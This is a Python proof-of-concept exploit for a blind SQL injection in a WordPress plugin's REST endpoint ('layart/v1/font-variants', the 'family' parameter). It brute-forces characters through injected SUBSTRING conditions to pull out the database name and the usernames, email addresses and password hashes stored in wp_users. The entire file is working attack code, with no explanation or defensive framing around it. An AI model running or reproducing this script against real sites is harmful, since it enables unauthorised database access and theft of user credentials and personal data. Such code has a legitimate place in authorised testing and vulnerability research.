import requests

url = "http://localhost/wp-json/layart/v1/font-variants"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-$!{}"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "application/json",
    "Connection": "close",
}

cookies = {
    "wp-settings-time-1": "1756871423"
}

def check_condition(resp: requests.Response) -> bool:
    return "label" in resp.text or "value" in resp.text

def extract_value(query: str, max_len=32) -> str:
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for ch in charset:
            payload = f"Roboto' AND SUBSTRING(({query}),{i},1)='{ch}'-- -"
            resp = requests.get(
                url,
                headers=headers,
                cookies=cookies,
                params={"family": payload}
            )
            if check_condition(resp):
                result += ch
                print(f"[+] Pos {i}: {ch} => {result}")
                found = True
                break
        if not found:
            break
    return result

def get_database_name():
    return extract_value("DATABASE()", max_len=32)

def get_user_field(row: int, field: str, max_len=64):
    query = f"SELECT {field} FROM wp_users LIMIT {row},1"
    return extract_value(query, max_len=max_len)

def get_users_data(max_rows=3):
    users = []
    for row in range(max_rows):
        username = get_user_field(row, "user_login", max_len=32)
        if not username:
            break
        email = get_user_field(row, "user_email", max_len=64)
        password = get_user_field(row, "user_pass", max_len=64)
        users.append({"username": username, "email": email, "password": password})
    return users

def main():
    db_name = get_database_name()
    print("[*] Database name:", db_name)

    users = get_users_data(max_rows=3)
    for u in users:
        print(u)

if __name__ == "__main__":
    main()
